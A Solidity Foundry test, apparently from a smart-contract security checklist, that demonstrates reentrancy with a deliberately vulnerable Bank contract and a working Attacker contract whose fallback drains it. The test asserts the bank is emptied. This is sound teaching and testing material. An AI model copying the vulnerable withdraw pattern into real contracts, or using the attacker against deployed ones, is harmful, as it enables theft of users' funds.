/**
 * Overview:
 * Checklist Item ID: SOL-AM-ReentrancyAttack-1
 *
 * This test demonstrates a reentrancy attack vulnerability in a simple bank contract.
 * The attacker contract calls the bank's withdraw function, which calls the attacker's fallback function before updating the bank's balances.
 * The fallback function then calls the bank's withdraw function again, allowing the attacker to withdraw more funds than they should be able to.
 */

pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract Bank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        // Check: Check balance before sending
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Interaction: External transfer of funds
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // Effect: Update balance before sending
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

contract Attacker {
    Bank public bank;

    constructor(Bank _bank) {
        bank = _bank;
    }

    function attack() public payable {
        // Step 1: Deposit funds to establish a legitimate balance
        bank.deposit{value: 1 ether}();

        // Step 2: Start the attack by withdrawing (this triggers the reentrancy)
        bank.withdraw(1 ether);

        // Step 3: Send all stolen funds back to the original caller
        msg.sender.call{value: address(this).balance}("");
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
        // When bank balance < 1 ether, recursion stops
    }
}

contract ReentrancyTest is Test {
    Bank public bank;
    Attacker public attacker;

    function setUp() public {
        bank = new Bank();
        attacker = new Attacker(bank);

        // Give the bank 10 ETH initially (simulating other users' deposits)
        vm.deal(address(bank), 10 ether);
    }

    function testReentrancyAttack() public {
        // Create an attacker EOA with 1 ETH
        address eoaAttacker = makeAddr("eoaAttacker");
        vm.deal(eoaAttacker, 1 ether);

        // Execute the attack
        vm.prank(eoaAttacker);
        attacker.attack{value: 1 ether}();

        // RESULTS: The attack should drain the entire bank!
        // Bank should be completely empty
        assertEq(address(bank).balance, 0);

        // Attacker should have stolen all 10 ETH + their original 1 ETH = 11 ETH total
        assertEq(eoaAttacker.balance, 11 ether);
    }
}